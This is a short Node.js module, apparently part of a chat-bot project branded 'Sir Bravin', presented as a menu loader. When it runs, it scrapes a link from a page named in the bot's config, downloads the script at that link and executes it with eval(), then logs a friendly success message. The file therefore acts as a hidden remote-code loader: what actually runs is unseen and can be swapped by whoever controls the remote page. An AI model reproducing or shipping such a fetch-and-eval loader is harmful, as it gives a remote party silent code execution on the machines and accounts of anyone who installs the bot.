//  [SIR BRAVIN EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir bravin                                    
//  >> Version: 8.3.5-sir bravin Bot

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchMENU2Url() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("bravin")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('MENU2 not found 😭');
    }

    console.log('bravin loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchMENU2Url();
